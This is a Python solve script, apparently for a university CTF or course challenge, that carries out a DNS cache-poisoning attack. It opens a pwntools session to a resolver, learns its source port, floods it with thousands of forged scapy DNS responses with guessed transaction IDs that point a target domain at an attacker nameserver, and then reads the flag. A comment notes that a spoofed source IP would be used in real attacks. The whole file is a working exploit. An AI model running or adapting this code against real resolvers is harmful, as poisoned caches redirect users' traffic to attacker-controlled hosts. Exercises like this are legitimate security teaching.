#!/usr/bin/env python3
from pwn import connect
from scapy.all import IP, UDP, Raw, send
import re
import random
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Optional
from utils import build_response_packet, RecordType, ResponseCode

# Configuration
TARGET_APEX_DOMAIN = "nasa.csie.org"
ATTACKER_NAMESERVER_IP = "140.112.30.185"
TTL = 86400

YOUR_REAL_IP = '172.24.0.10' # TODO: fill in your actual ip here
SPOOFED_IP = '140.112.30.191'
SPOOFED_PORT = 53053
SERVER_IP = '140.112.91.4' # nasaws4.csie.ntu.edu.tw

BATCH_SIZE = 2040
MAX_TRANSACTION_ID = 65535
MAX_WORKERS = 1020

def extract_port(output):
    # Extract the source port from the server's output
    match = re.search(r"source port (\d+)", output)
    if match:
        return int(match.group(1))
    else:
        raise ValueError("Could not extract source port from server output.")

def send_dns_response(
    src_ip: str,    dst_ip: str,
    src_port: int,  dst_port: int,
    transaction_id: int,
    domain: str,
    qtype: RecordType,
    answer: str,
    ttl: int,
    auth_ip: Optional[str] = None
):
    response_packet = build_response_packet(
        tid=transaction_id,
        domain=domain,
        qtype=qtype,
        rcode=ResponseCode.NOERROR,
        answer=answer,
        ttl=ttl,
        auth_ip=auth_ip
    )

    ip_layer = IP(src=src_ip, dst=dst_ip)
    udp_layer = UDP(sport=src_port, dport=dst_port)
    raw_layer = Raw(load=response_packet)

    packet = ip_layer / udp_layer / raw_layer
    send(packet, verbose=0)

def main():
    server = connect(SERVER_IP, 48766)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        i: int = 0
        while True:
            subdomain = f"{i}.{TARGET_APEX_DOMAIN}"
            print('Subdomain:', subdomain)

            # send query
            server.recvuntil(b'Provide a query')
            server.sendline(f"{subdomain} A".encode())

            # extract source port
            output = server.recvline_contains(b'source port').decode()
            server_port = extract_port(output)
            print(f"Extracted source port: {server_port}")

            start: float = time.time()
            maps = pool.map(
                lambda transaction_id: send_dns_response(
                    src_ip=YOUR_REAL_IP, # in practice, SPOOFED_IP should be used instead
                    src_port=SPOOFED_PORT,
                    dst_ip=SERVER_IP,
                    dst_port=server_port,
                    transaction_id=transaction_id,
                    domain=subdomain,
                    qtype=RecordType.A,
                    answer=ATTACKER_NAMESERVER_IP,
                    ttl=TTL,
                    auth_ip=ATTACKER_NAMESERVER_IP
                ),
                random.sample(list(range(0, MAX_TRANSACTION_ID + 1)), BATCH_SIZE)
            )
            list(maps) # pool.map() returns an iterator, so converting to list blocks until all are done
            print('complete in time:', time.time()-start)

            try:
                response = server.recvline_contains(b'DNS Response', timeout=0.5).decode()
                if ATTACKER_NAMESERVER_IP in response:
                    break
            except EOFError:
                pass
            print('the cache has not been poisoned')
            i += 1

    print('attack succeeded')
    # server.interactive() # proceed to retrieve the flag from 140.112.30.185 in interactive mode

    server.sendline(f"team48763.{TARGET_APEX_DOMAIN} TXT".encode())
    print(re.search(r'NASA2025\{.+\}', server.recvline_contains(b'DNS Response').decode()).group(0))


if __name__ == "__main__":
    main()
